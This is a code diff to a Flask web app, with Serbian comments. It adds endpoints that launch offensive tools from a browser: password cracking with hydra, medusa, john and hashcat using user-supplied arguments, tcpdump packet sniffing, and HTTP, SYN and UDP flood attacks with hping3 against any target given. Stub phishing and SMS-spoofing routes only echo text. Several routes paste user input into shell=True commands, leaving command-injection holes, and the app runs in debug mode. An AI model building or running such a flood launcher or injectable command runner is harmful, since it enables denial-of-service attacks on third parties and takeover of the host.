@@ -226,18 +226,18 @@ def password_cracking():
         tool = request.form['tool']
         arguments = request.form['arguments']
         
-        # Komandne linije za alatke
+        # Mape alatki na komandne linije
         tools = {
             'hydra': 'hydra',
             'medusa': 'medusa',
             'johntheripper': 'john',
             'hashcat': 'hashcat'
         }
-        
-        # Proveri da li je alat dostupan
+
+        # Ako je izabran validan alat
         if tool in tools:
             try:
-                # Izvrši alat sa argumentima
+                # Formiramo komandu za izvršavanje
                 command = f"{tools[tool]} {arguments}"
                 process = subprocess.run(command.split(), capture_output=True, text=True)
                 result = process.stdout or process.stderr
@@ -247,5 +247,96 @@ def password_cracking():
             result = "Invalid tool selected."
     
     return render_template('password_cracking.html', result=result)
+@app.route('/sniffing')
+def sniffing_home():
+    return render_template('sniffing.html')
+
+@app.route('/run_tool', methods=['POST'])
+def run_tool():
+    data = request.get_json()
+    tool = data.get('tool')
+
+    if tool not in ['tcpdump', 'wireshark', 'ettercap']:
+        return jsonify({"error": "Invalid tool selected"}), 400
+
+    # Simulating command execution (replace this with actual commands)
+    command_map = {
+        "tcpdump": "tcpdump -c 10 -i any",  # Example TCPDump command
+        "wireshark": "echo 'Wireshark GUI cannot run here'",  # Wireshark simulation
+        "ettercap": "ettercap --help"  # Example Ettercap command
+    }
+    
+    try:
+        result = subprocess.run(command_map[tool], shell=True, text=True, capture_output=True)
+        output = result.stdout or result.stderr
+    except Exception as e:
+        output = f"Error: {str(e)}"
+    
+    return jsonify({"output": output})
+@app.route('/ddos_tools')
+def ddos_home():
+    return render_template('ddos_tools.html')
+
+@app.route('/start_ddos', methods=['POST'])
+def start_ddos():
+    data = request.get_json()
+    target = data.get('target')
+    method = data.get('method')
+    requests = data.get('requests')
+
+    if not target or not method or not requests:
+        return jsonify({"error": "Invalid input"}), 400
+
+    # Map methods to commands
+    command_map = {
+        "http-flood": f"curl -X GET {target} -m 10 -s -o /dev/null",
+        "syn-flood": f"hping3 -S {target} -p 80 -c {requests}",
+        "udp-flood": f"hping3 --udp {target} -p 80 -c {requests}"
+    }
+
+    command = command_map.get(method)
+    if not command:
+        return jsonify({"error": "Invalid attack method"}), 400
+
+    try:
+        result = subprocess.run(command, shell=True, text=True, capture_output=True)
+        output = result.stdout or result.stderr
+    except Exception as e:
+        output = f"Error: {str(e)}"
+
+    return jsonify({"output": output})
+
+@app.route('/social_engineering')
+def social_engineering_page():
+    return render_template('social_engineering.html')
+
+@app.route('/run_social_tool', methods=['POST'])
+def run_social_tool():
+    data = request.get_json()
+    tool = data.get('tool')
+    target = data.get('target')
+
+    if not tool or not target:
+        return jsonify({"error": "Morate odabrati alat i uneti ciljnu adresu."}), 400
+
+    # Mapiranje alata na komande
+    command_map = {
+        "phishing_email": f"echo 'Simulating phishing email to {target}'",
+        "fake_website": f"echo 'Creating fake website for {target}'",
+        "sms_spoofing": f"echo 'Simulating SMS spoofing to {target}'"
+    }
+
+    command = command_map.get(tool)
+    if not command:
+        return jsonify({"error": "Izabrani alat nije podržan."}), 400
+
+    try:
+        result = subprocess.run(command, shell=True, text=True, capture_output=True)
+        output = result.stdout or result.stderr
+    except Exception as e:
+        output = f"Greška prilikom pokretanja alata: {str(e)}"
+
+    return jsonify({"output": output})
+
 if __name__ == '__main__':
     app.run(debug=True)
